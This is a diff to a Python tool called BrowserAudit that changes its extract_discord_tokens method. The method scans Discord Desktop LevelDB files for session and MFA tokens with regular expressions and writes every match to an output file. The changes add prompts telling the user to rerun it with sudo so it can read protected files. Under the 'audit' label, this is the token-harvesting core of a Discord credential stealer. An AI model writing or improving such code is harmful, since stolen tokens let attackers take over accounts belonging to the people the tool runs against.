@@ -237,7 +237,6 @@ class BrowserAudit:
     def extract_discord_tokens(self):
         import glob
         import re
-        import base64
 
         print(f"{self.COLORS['CYAN']}[*] Extracting Discord Desktop tokens...{self.COLORS['RESET']}")
         self.log("INFO", "Starting Discord Desktop token extraction")
@@ -260,7 +259,6 @@ class BrowserAudit:
         found_any = False
         token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}'
         hex_pattern = r'[a-f0-9]{32,}'
-        b64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
 
         for app_name, discord_dir in discord_dirs.items():
             if not discord_dir.exists():
@@ -271,7 +269,12 @@ class BrowserAudit:
                 continue
 
             try:
-                for file in glob.glob(f"{leveldb_path}/*.ldb") + glob.glob(f"{leveldb_path}/*.log"):
+                files = glob.glob(f"{leveldb_path}/*.ldb") + glob.glob(f"{leveldb_path}/*.log")
+                if not files and os.geteuid() != 0:
+                    self.log("WARNING", f"{app_name} files not accessible - try running with sudo")
+                    continue
+
+                for file in files:
                     try:
                         with open(file, 'r', encoding='ISO-8859-1') as f:
                             content = f.read()
@@ -292,6 +295,8 @@ class BrowserAudit:
                                         if len(candidate) > 20:
                                             out.write(f"[{app_name}] (encrypted/hex) {candidate}\n")
                                             found_any = True
+                    except PermissionError:
+                        self.log("WARNING", f"Permission denied reading {file} - try with sudo")
                     except:
                         pass
             except Exception as e:
@@ -300,9 +305,9 @@ class BrowserAudit:
         self.log("INFO", f"Discord extraction complete, found tokens: {found_any}")
 
         if found_any:
-            print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted (some may be encrypted){self.COLORS['RESET']}\n")
+            print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}\n")
         else:
-            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (run audit while Discord is open){self.COLORS['RESET']}\n")
+            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (try: sudo ./dist/audit-macos){self.COLORS['RESET']}\n")
 
     def filter_display_content(self, content, filename):
         if 'discord_tokens' in filename or 'discord_web' in filename:
